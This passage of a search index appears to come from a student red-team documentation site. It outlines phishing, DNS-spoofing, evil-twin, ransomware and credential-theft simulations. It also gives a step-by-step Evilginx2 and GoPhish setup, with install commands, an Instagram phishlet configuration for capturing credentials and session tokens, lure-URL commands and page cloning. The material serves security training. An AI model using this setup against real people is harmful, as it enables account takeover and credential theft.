emails, enabling the creation of convincing phishing attempts.Send Clone Emails to Targeted Individuals: Assess awareness and response by sending clone emails to targeted individuals.  ","version":"Next","tagName":"h3"},{"title":"7.3 Tools and Techniques:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#73-tools-and-techniques","content":" Email Replication: Leveraging tools such as GoPhish, we meticulously replicate authentic emails with subtle modifications, ensuring our clone phishing attempts are highly convincing and indistinguishable from legitimate correspondence.Content Analysis: Through meticulous examination of previous emails, we discern patterns and content that can be replicated, significantly boosting the authenticity and success rate of our phishing campaigns.Phishing Platforms: We harness the capabilities of sophisticated platforms equipped with customization features to streamline the creation and dissemination of clone phishing emails, optimizing our efforts for maximum impact and efficacy.  ","version":"Next","tagName":"h3"},{"title":"8 DNS Spoofing Simulation​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#8-dns-spoofing-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"8.1 Objective:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#81-objective","content":" Assess an organization's preparedness against DNS manipulation-based phishing attacks.  ","version":"Next","tagName":"h2"},{"title":"8.2 Steps:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#82-steps","content":" Modify DNS Records: Alter DNS records to reroute users from legitimate sites to malicious ones under the attacker's control.Phish for Data: Create fake login pages or forms on the malicious sites to deceive users into providing credentials or sensitive information.Data Harvesting: Capture the information entered by users on these fake pages for malicious use.  ","version":"Next","tagName":"h2"},{"title":"8.3 Tools and Techniques:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#83-tools-and-techniques","content":" DNS Spoofing Tools: Employing software like dnsspoof or Ettercap, we manipulate DNS responses to reroute users from legitimate websites to malicious ones under our control. This deceptive tactic allows us to intercept unsuspecting users' traffic and exploit their interactions with fraudulent web pages. Fake Web Pages: Our strategy involves meticulously crafting replicas of authentic login pages or forms on malicious websites, meticulously designed to deceive users into divulging sensitive information. By closely mimicking the appearance and functionality of legitimate sites, we enhance the effectiveness of our phishing campaigns.Data Interception: Leveraging packet sniffing tools such as Wireshark, we intercept and capture sensitive information transmitted over the network. Through this methodical approach, we gain access to valuable data, including usernames, passwords, and financial details, enabling us to exploit the vulnerabilities of our targets.  ","version":"Next","tagName":"h2"},{"title":"9 Angler Phishing Simulation:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#9-angler-phishing-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"9.1 Objective:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#91-objective","content":" Evaluate how susceptible an organization is to phishing attacks via compromised websites or applications.  ","version":"Next","tagName":"h3"},{"title":"9.2 Steps:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#92-steps","content":" Identify Vulnerable Websites: Find sites or apps with security weaknesses allowing the injection of malicious content.Redirect Users: Employ tactics like hijacked ads or fake login pages to steer users to the compromised sites.Capture Credentials: Prompt users to input login details or sensitive data on fake pages,capturing this information for misuse.  ","version":"Next","tagName":"h3"},{"title":"9.3 Tools and Techniques:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#93-tools-and-techniques","content":" Exploit Kits: We employ tools like Blackhole or Angler to capitalize on weaknesses within websites or applications, exploiting security vulnerabilities. These kits automate the process, enabling us to launch attacks efficiently and effectively, increasing the likelihood of successful infiltration.Malicious Redirection: By tampering with URLs or advertisements, we divert users to compromised sites under our control. This manipulation heightens the risk of users interacting with malicious content, facilitating unauthorized access to sensitive information.Credential Harvesting: Through techniques like keylogging or form grabbing, we illicitly capture user credentials and sensitive data. This clandestine approach enables us to steal valuable information without the user's knowledge.  ","version":"Next","tagName":"h3"},{"title":"10 Evil Twin Phising Simulation​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#10-evil-twin-phising-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"10.1 Objective:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#101-objective","content":" Assess awareness and response to Wi-Fi-based phishing attacks.  ","version":"Next","tagName":"h3"},{"title":"10.2 Steps:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#102-steps","content":" Set Up Rogue Wi-Fi Hotspots: Create rogue Wi-Fi hotspots mimicking legitimate networks to lure users.Entice Users to Connect to Rogue Hotspots: Attract users with free or unsecured Wi-Fi access.Intercept and Capture Sensitive Information: Capture sensitive information transmitted over compromised Wi-Fi connection.  ","version":"Next","tagName":"h3"},{"title":"10.3 Tools and Techniques:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#103-tools-and-techniques","content":" Rogue Wi-Fi Networks: Leveraging Wi-Fi Pineapple devices, we establish deceptive Wi-Fi hotspotsmirroring authentic networks, enticing unsuspecting users to connect.Traffic Interception: Employing packet sniffing tools such as Wireshark, we intercept and scrutinize network traffic, extracting critical data like usernames and passwords for unauthorized access.Social Manipulation: Through enticing offers of free or unsecured Wi-Fi access, coupled with the emulation of genuine network appearances, we coax users into connecting to our rogue hotspots, amplifying our ability to exploit their vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"11 Conclusion:​","type":1,"pageTitle":"Phishing Attack Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Phishing-Attack-Red-Team-Usecase#11-conclusion","content":" The Red Team Phishing Simulation Playbook provides a comprehensive framework for executing simulated phishing attacks across various vectors. By implementing these simulations and leveraging recommended tools and techniques, organizations can identify vulnerabilities, enhance their security posture, and mitigate the risks associated with phishing attacks. Continuous testing, refinement, and employee education are crucial for effectively defending against the evolving threat landscape, safeguarding assets, data, and reputation from malicious actors. ","version":"Next","tagName":"h2"},{"title":"Evilginx2 and GoPhish Tool Usage Demonstration for Phishing","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PhishingVps","content":"","keywords":"","version":"Next"},{"title":"About Tool​","type":1,"pageTitle":"Evilginx2 and GoPhish Tool Usage Demonstration for Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PhishingVps#about-tool","content":" Evilginx2 was created by Kuba Gretzky, a well-known figure in the cybersecurity community. He developed Evilginx2 as an advanced phishing tool that leverages man-in-the-middle (MitM) techniques to capture login credentials and session tokens, making it highly effective against various authentication mechanisms.  ","version":"Next","tagName":"h2"},{"title":"Pre-requisites:​","type":1,"pageTitle":"Evilginx2 and GoPhish Tool Usage Demonstration for Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PhishingVps#pre-requisites","content":" Domain Name: A domain name, which can be bought through Squarespace.Server: A server to run Evilginx2, which can be obtained from Digital Ocean.SSL/TLS Certificates: For securing the phishing pages.Evilginx2 Installation: Install Evilginx2 on your server.Golang  ","version":"Next","tagName":"h2"},{"title":"Installation:​","type":1,"pageTitle":"Evilginx2 and GoPhish Tool Usage Demonstration for Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PhishingVps#installation","content":" After getting a domain and server, make sure the domain is directed to the server by adding the name servers of the server. The server should have an IP address. Use that to login into your server and make sure to note the password.    After logging in, follow these steps:  Install Go (Golang): sudo apt update and sudo apt install golangInstall Git: sudo apt update and sudo apt install gitClone the Evilginx2 Repository: git clone &quot;https://github.com/kgretzky/evilginx2.git&quot;Navigate into the Evilginx2 Directory: cd evilginx2Build Evilginx2: go buildStart Evilginx2: ./evilginx2    ","version":"Next","tagName":"h2"},{"title":"Phishlets Configuration:​","type":1,"pageTitle":"Evilginx2 and GoPhish Tool Usage Demonstration for Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PhishingVps#phishlets-configuration","content":" Phishlets are essential components of Evilginx2, allowing you to create and deploy phishing pages that mimic login interfaces of various services. Each phishlet is a configuration file that defines how the phishing page should interact with the real login page and how it captures login credentials and session tokens. Phishlets directory can be found in the evilginx2 directory.  To create a file, use touch once in the directory:  touch insta.yaml  To edit phishlets, use nano:  nano insta.yaml    For this demonstration, I used Instagram’s login page. The image above shows the basic phishlet script for the Instagram page. (Note: this tool doesn’t provide any pre-made phishlets or links.)  Version Requirement: min_ver: '3.0.0' means you need Evilginx2 version 3.0.0 or later.Proxy Hosts: phish_sub: 'instagram': Your phishing site will be something like instagram.yourdomain.com.orig_sub: 'www': Refers to Instagram’s actual site.domain: 'instagram.com': This is the domain you’re targeting.session: true: Captures session tokens to bypass login checks.is_landing: true: This is the main page of your phishing setup.auto_filter: true: Automatically filters out unwanted elements. Sub Filters: triggers_on: 'instagram.com': Modifies content related to Instagram.search: 'au-link.net': Finds specific text in the page content.replace: 'instagram.com': Replaces that text with instagram.com.mimes: ['text/html']: Applies these changes to HTML. Auth Tokens: domain: '.instagram.com': Captures tokens from Instagram’s domain.keys: Includes tokens like csrftoken, sessionid, and others to grab the session. Credentials: Username and password sections show how to extract these from POST requests. Login: domain: 'www.instagram.com': Instagram’s login page domain.path: '/accounts/login': The exact path to the login page.  In a nutshell, this setup makes Evilginx2 create a phishing page that mimics Instagram’s login, so you can capture users' credentials and session tokens.  After configuring the phishlet, head back and start Evilginx2:    Use the command phishlets enable hostname yourDomainName.  This command activates a phishlet and connects it to your domain. Evilginx2 will use the phishlet to create a phishing page on .yourdomain.com, making the phishing page active and ready to capture login details.    After that, to enable the phishlet, use the command:  phishlets enable yourPhishletName  This enables the phishlet and sets up TLS certificates.  Next, use the command:  lures create yourPhishletNamelures get-url yourPhishletName  This command provides a URL or the phishing page link.    Here you can see the link works properly. To find the details of the session and captured credentials, use the command:  sessionsThe number of the session you want details about.    ","version":"Next","tagName":"h2"},{"title":"GoPhish Configurations:​","type":1,"pageTitle":"Evilginx2 and GoPhish Tool Usage Demonstration for Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PhishingVps#gophish-configurations","content":" ","version":"Next","tagName":"h2"},{"title":"Email Template:​","type":1,"pageTitle":"Evilginx2 and GoPhish Tool Usage Demonstration for Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PhishingVps#email-template","content":" Choose a website: Pick any site you want to create a phishing email for (e.g., Facebook).    Check Your Email: Open the email sent by the website. For example, look for a login-related email from Facebook.    Open Original Message: Click on the three dots (more options) in the email message.Select &quot;Show Original&quot; to view the original message.  Copy the content: Highlight the entire original message and copy it to your clipboard.      Create Email Template: Go to your GoPhish dashboard.Create a new email template and paste the copied content into the template.Edit as needed: Modify the template to fit your phishing campaign.Save and use the template for your phishing campaign.  ","version":"Next","tagName":"h3"},{"title":"Landing Page:​","type":1,"pageTitle":"Evilginx2 and GoPhish Tool Usage Demonstration for Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PhishingVps#landing-page","content":" For the landing page, click &quot;Import Site&quot; on the top and enter the link address of the site you want to clone. GoPhish does the rest. Ensure you tick &quot;Capture Data and Passwords.&quot; After the page is loaded, save and use it.    ","version":"Next","tagName":"h3"},{"title":"How the mail looks in the victim's mail app:​","type":1,"pageTitle":"Evilginx2 and GoPhish Tool Usage Demonstration for Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PhishingVps#how-the-mail-looks-in-the-victims-mail-app","content":"     ","version":"Next","tagName":"h2"},{"title":"Details of the Campaign:​","type":1,"pageTitle":"Evilginx2 and GoPhish Tool Usage Demonstration for Phishing","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PhishingVps#details-of-the-campaign","content":"   Note: Don’t use personal mail for phishing!    Unfortunately, the email phishing attempt using GoPhish was unsuccessful. Despite testing the campaign with three students' email addresses, the emails were consistently flagged, and the domain was marked as a phishing site. As a result, the phishing emails never reached the intended recipients, failing to bypass security filters. ","version":"Next","tagName":"h2"},{"title":"Root-Access Red Team Usecase","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#1-introduction","content":" As part of our red team operations, our goal is to run thorough simulations that gauge the organization's security readiness across different threat scenarios. We'll mimic real-world attack methods to pinpoint weaknesses, defensive shortcomings, and areas needing enhancement. Our simulations cover insider threats, external attacks, data breaches, phishing attempts, ransomware incidents, and credential theft scenarios, all with the aim of gaining root access—the highest level of privilegewithin the organization's systems. Our findings will offer practical insights to bolster security measures and response strategies.  ","version":"Next","tagName":"h2"},{"title":"2 Insider Threat Simulation​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#2-insider-threat-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"2.1 Objective:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#21-objective","content":" Our mission in this simulation is to assess how well the organization can fend off attempts by insiders to gain unauthorized access to higher levels of privilege within the system.  ","version":"Next","tagName":"h3"},{"title":"2.2 Steps:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#22-steps","content":" Research the organization's internal structure, roles, and access levels to identify potential targets: We'll delve deep into the organization's hierarchy, understanding who has access to what, and which positions hold the keys to sensitive information or critical systems. By meticulously analyzing roles and permissions, we aim to pinpoint the most lucrative targets for exploitation.Gain initial access through legitimate means, such as an employee account: We'll start by slipping into the system using methods that insiders might employ, like tricking an employee into revealing their credentials or exploiting weak security protocols. Once inside, we'll blend into the environment, mirroring the behavior of legitimate users to avoid suspicion.Enumerate available privileges and attempt to escalate to root access using techniques like privilege escalation exploits or misconfigurations: Once inside, we'll scrutinize the permissions of the compromised account. We'll then employ tricks such as exploiting loopholes in configurations or using known methods to escalate privileges, inching closer to obtaining root access. By meticulously navigating the system's architecture, we'll seek out vulnerabilities that could lead to elevated privileges.Maintain persistence while avoiding detection by security controls: We'll work to stay hidden within the system, ensuring our actions don't set off any alarm bells. This means erasing our digital footprints, evading security tools like intrusion detection systems, and staying under the radar of security personnel. Through careful evasion and stealthy maneuvers, we'll aim to remain undetected for as long as possible,simulating the persistence of a determined attacker.  ","version":"Next","tagName":"h3"},{"title":"2.3 Tools & Techniques:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#23-tools--techniques","content":" Metasploit: Think of this as our Swiss Army knife. Metasploit offers a range of exploits and tools to help us breach defenses, escalate privileges, and maintain control over compromised systems. With its extensive database of vulnerabilities and automated exploitation capabilities, Metasploit streamlines the process of identifying and exploiting weaknesses in the organization's defenses.Mimikatz: This tool is like a master key for stealing credentials. Mimikatz helps us extract login details and perform pass-the-hash attacks, crucial for moving up the privilege ladder. By harvesting credentials from compromised systems, Mimikatz enables us to impersonate legitimate users and gain access to sensitive resources undetected.BloodHound: It's our map through the organization's Active Directory. BloodHound lets us visualize trust relationships and find the best paths to escalate privileges,making our job easier and more efficient. By graphically representing the network's topology and identifying attack paths, BloodHound helps us identify critical assets and prioritize our exploitation efforts.PowerShell Empire: This toolkit is our silent partner. With PowerShell Empire, we can execute commands discreetly, maintain control over systems, and slip past traditional security measures with ease. By leveraging PowerShell's scripting capabilities, PowerShell Empire enables us to evade detection by antivirus software and execute sophisticated attacks with minimal traceability.  ","version":"Next","tagName":"h3"},{"title":"3 External Attack Simulation:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#3-external-attack-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"3 .1 Objective​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#3-1-objective","content":" Our goal in this simulation is to evaluate how well the organization can withstand external threats attempting to gain root access to its systems.  ","version":"Next","tagName":"h3"},{"title":"3.2 Steps:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#32-steps","content":" Conduct reconnaissance to gather information about the organization's external- facing assets, such as websites, servers, and applications:We'll start by scouting out the organization's digital footprint, identifying all publicly accessible assets. This involves scouring the internet for information on websites, servers, and applications that could serve as potential entry points for attackers.Identify vulnerabilities using automated scanners or manual testing: Once we have a clear picture of the organization's external assets, we'll use tools like Nmap and Nessus to scan for vulnerabilities. These tools will help us identify weaknesses in the organization's defenses, such as outdated software versions or misconfigurations that could be exploited by attackers.Exploit vulnerabilities to gain initial access to the network or systems: With a list of vulnerabilities in hand, we'll leverage tools like Metasploit and Burp Suite to exploit them and gain a foothold into the organization's network or systems. This could involve launching targeted attacks against specific vulnerabilities, such as exploiting unpatched software or misconfigured services.Escalate privileges to root level by exploiting weaknesses in authentication mechanisms or misconfigurations: Once inside the network, our next step is to escalate our privileges to gain root access. We'll use techniques like brute force attacks with Hydra or exploiting weaknesses in authentication mechanisms to elevate our privileges and gain full control over the organization's systems.  ","version":"Next","tagName":"h3"},{"title":"3.3 Tools & Techniques:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#33-tools--techniques","content":" Nmap: This powerful network scanning tool helps us map out the organization's external infrastructure, identifying open ports, services, and potential vulnerabilities. By providing detailed insights into the organization's network topology, Nmap enables us to prioritize our attack vectors effectively.Nessus: Nessus is a comprehensive vulnerability scanner that automates the process of identifying security weaknesses in the organization's external assets. By conducting thorough vulnerability assessments, Nessus helps us identify potential entry points for exploitation and assess the organization's overall security posture.Burp Suite: Burp Suite is a versatile web application security testing tool that enables us to identify and exploit vulnerabilities in web applications. With features like proxying, scanning, and exploitation, Burp Suite allows us to uncover security flaws such as SQL injection and cross-site scripting (XSS) that could be leveraged by attackers.Metasploit: Metasploit is a penetration testing framework that provides a wide range of exploits and payloads for gaining unauthorized access to systems. By leveraging its extensive database of exploits, Metasploit enables us to launch targeted attacks against vulnerable systems and escalate our privileges to gain root access.Hydra: Hydra is a popular password-cracking tool that helps us perform brute force attacks against authentication mechanisms, such as login screens and web forms. By systematically guessing passwords, Hydra enables us to exploit weak or default credentials and gain unauthorized access to systems.  ","version":"Next","tagName":"h3"},{"title":"4 Data Breach Simulation:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#4-data-breach-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"4.1 Objective​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#41-objective","content":" Our objective in this simulation is to evaluate the organization's ability to detect and respond to unauthorized access leading to data exfiltration.  ","version":"Next","tagName":"h3"},{"title":"4.2 Steps:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#42-steps","content":" Gain initial access to sensitive systems or databases: We'll begin by infiltrating the organization's network or systems through various means, such as exploiting vulnerabilities or compromising user credentials. Our aim is to gain a foothold in sensitive areas where valuable data is stored.Identify and exfiltrate valuable data without triggering detection mechanisms: Once inside, we'll carefully identify and extract valuable data without raising suspicion. This could involve searching for databases containing sensitive information or accessing file servers where confidential documents are stored.Cover tracks to avoid detection, such as deleting logs or modifying timestamps: To evade detection, we'll take steps to cover our tracks and erase any evidence of our activities. This might include deleting log files, altering timestamps, or using anti-forensic techniques to make it difficult for investigators to trace our actions.  ","version":"Next","tagName":"h3"},{"title":"4.3 Tools & Techniques:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#43-tools--techniques","content":" Cobalt Strike: Cobalt Strike is a powerful penetration testing tool that provides advanced capabilities for post-exploitation activities, including data exfiltration. With its built-in command and control (C2) framework, Cobalt Strike allows us to maintain control over compromised systems and exfiltrate data stealthily.Wireshark: Wireshark is a network protocol analyzer that enables us to capture and inspect network traffic in real-time. By monitoring network communications, Wireshark helps us identify and extract sensitive data being transmitted over the network, such as login credentials or confidential documents.rsync: rsync is a file synchronization tool that can be abused for data exfiltration purposes. By leveraging its ability to transfer files between systems, we can exfiltrate large volumes of data from compromised servers to external locations without attracting attention.Data exfiltration frameworks: These frameworks provide a set of tools and techniques for exfiltrating data from compromised systems using various covert channels. By encrypting data and disguising it within legitimate network traffic or file transfers, these frameworks enable us to bypass security controls and evade detection.Data exfiltration over encrypted channels: Encrypting data before exfiltration helps conceal sensitive information from detection mechanisms, making it harder for defenders to identify and block unauthorized data transfers.File transfer protocols: Leveraging protocols like FTP, SCP, or HTTP, we can securely transfer stolen data from compromised systems to external servers without raising suspicion. By encrypting data during transit, we can further enhance the security of the exfiltration process.  ","version":"Next","tagName":"h3"},{"title":"5 Phishing Incident Simulation:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#5-phishing-incident-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"5.1 Objective:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#51-objective","content":" Our aim in this simulation is to assess how well the organization's email security measures and user awareness training can defend against phishing attacks, a common vector for cyber threats.  ","version":"Next","tagName":"h3"},{"title":"5.2 Steps:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#52-steps","content":" Craft convincing phishing emails designed to trick employees into divulging credentials or executing malicious payloads: We'll meticulously design phishing emails tailored to appear legitimate and compelling, enticing employees to take action. These emails may mimic official communication from trusted sources or present urgent scenarios to prompt immediate response.Distribute phishing emails to targeted employees or departments: Using tools like GoPhish and the Social-Engineer Toolkit (SET), we'll execute the distribution phase. We'll target specific individuals or departments within the organization, tailoring the phishing emails to match their roles or interests. This targeted approach enhances the likelihood of successful deception.Capture credentials entered by users who fall for the phishing emails: As recipients interact with the phishing emails and provide their credentials, we'll capture this sensitive information using techniques like Evilginx. This tool intercepts and logs login credentials entered by unsuspecting users, allowing us to harvest valuable data for further exploitation.Use obtained credentials to gain access to sensitive systems or escalate privileges to root level: With the harvested credentials in hand, we'll attempt to infiltrate sensitive systems or escalate privileges within the organization's network.Techniques such as spear phishing and credential harvesting enable us to bypass security measures and gain unauthorized access. This step demonstrates the potential consequences of successful phishing attacks, highlighting the importance of robust security measures and user vigilance.  ","version":"Next","tagName":"h3"},{"title":"5.3 Tools & Techniques:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#53-tools--techniques","content":" GoPhish: GoPhish is a phishing simulation and training platform that allows us to create and execute realistic phishing campaigns. It provides templates for crafting convincing phishing emails and features for tracking recipient interactions. GoPhish enables us to assess the organization's susceptibility to phishing attacks and measure the effectiveness of user awareness training.Social-Engineer Toolkit (SET): SET is a comprehensive toolkit for social engineering attacks, including phishing. It provides a range of tools and modules for crafting and delivering phishing emails, as well as conducting credential harvesting and other malicious activities. SET facilitates the automation of phishing campaigns and enhances their success rate.Evilginx: Evilginx is a tool specifically designed for intercepting and logging user credentials obtained through phishing attacks. It operates as a man-in-the-middle proxy, capturing login credentials entered by users and storing them for later retrieval. Evilginx enables us to demonstrate the ease with which attackers can harvest credentials from unsuspecting users, emphasizing the need for robust authentication mechanisms and user education.  ","version":"Next","tagName":"h2"},{"title":"6 Ransomware Attack Simulation:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#6-ransomware-attack-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"6.1 Objective​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#61-objective","content":" Our objective in this simulation is to evaluate the organization's readiness to prevent,detect, and respond to ransomware attacks that target root access, thereby safeguarding critical systems and data.  ","version":"Next","tagName":"h3"},{"title":"6.2 Steps:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#62-steps","content":" Gain initial access to the network or systems through phishing or exploiting vulnerabilities: To initiate the attack, we'll first establish a foothold within the organization's network or systems. This could involve exploiting vulnerabilities discovered during reconnaissance or leveraging phishing techniques to trick employees into executing malicious payloads.Deploy ransomware payloads across the organization's infrastructure: Once inside the network, we'll deploy ransomware payloads across various endpoints and servers. These payloads are carefully crafted to encrypt files and systems rapidly, maximizing the impact of the attack and rendering critical data inaccessible to legitimate users.Encrypt critical files and systems, including those with root access: Our primary objective is to encrypt critical files and systems, including those with root access privileges. By targeting these assets, we aim to disrupt the organization's operations significantly and exert pressure on decision-makers to comply with ransom demands.Demand ransom payment and monitor the organization's response: Following the encryption phase, we'll deliver ransom notes to the organization's administrators, demanding payment in exchange for decryption keys. Throughout this process, we'll monitor the organization's response and assess its effectiveness in containing the attack, negotiating with threat actors, and restoring operations.  ","version":"Next","tagName":"h3"},{"title":"6.3 Tools & Techniques:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#63-tools--techniques","content":" Cobalt Strike: Cobalt Strike serves as our primary command and control (C2) framework, enabling us to execute malicious activities stealthily and maintain persistence within the organization's network. It provides a range of capabilities for post-exploitation, including fileless malware deployment and lateral movement techniques.Locky, WannaCry, CryptoLocker: These are examples of ransomware families commonly used in simulated attacks. Each variant is designed to encrypt files using strong encryption algorithms, making decryption without the proper key practically impossible. By deploying these ransomware payloads strategically, we can maximize the impact on the organization's systems and data.Malicious payload delivery: We'll leverage various delivery methods, such as phishing emails or exploit kits, to distribute ransomware payloads across the organization's infrastructure. By disguising malicious payloads as legitimate files or documents, we increase the likelihood of successful execution and infection.Lateral movement: To maximize the scope of the attack, we'll employ lateral movement techniques to propagate the ransomware across the organization's network. This could involve exploiting vulnerabilities in unpatched systems or abusing legitimate tools and protocols to move laterally between endpoints and servers.Encryption of files and directories: Ransomware payloads are programmed to encrypt files and directories using strong encryption algorithms, rendering them inaccessible to legitimate users. By encrypting critical data, including those with root access privileges, we aim to disrupt the organization's operations and increase the urgency of ransom payment.  ","version":"Next","tagName":"h3"},{"title":"7 Credential Theft Simulation​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#7-credential-theft-simulation","content":"   ","version":"Next","tagName":"h2"},{"title":"7.1 Objective:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#71-objective","content":" Our objective in this simulation is to evaluate the organization's ability to withstand credential theft attacks, which can lead to unauthorized access to sensitive systems and escalation of privileges to root level.  ","version":"Next","tagName":"h3"},{"title":"7.2 Steps:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#72-steps","content":" -Use various methods such as phishing, keylogging, or password spraying to steal employee credentials: We'll employ a variety of tactics to steal employee credentials, including phishing emails designed to trick users into revealing their login credentials, keyloggers installed on compromised systems to capture keystrokes, and password spraying attacks that attempt to guess weak passwords.  Test stolen credentials to identify accounts with elevated privileges, including root access: Once we have obtained credentials through our chosen methods, we'll test them to identify accounts with elevated privileges, such as those with root access. This involves querying the organization's authentication systems to determine the level of access associated with the stolen credentials.Attempt to gain access to sensitive systems or escalate privileges using stolen credentials: With the stolen credentials verified and accounts with elevated privileges identified, we'll attempt to gain access to sensitive systems or escalate privileges within the organization's network. This may involve exploiting weaknesses in authentication mechanisms or misconfigurations to achieve root access.  ","version":"Next","tagName":"h3"},{"title":"7.3 Tools & Techniques:​","type":1,"pageTitle":"Root-Access Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Root-Access-Red-Team-Usecase#73-tools--techniques","content":" Mimikatz: 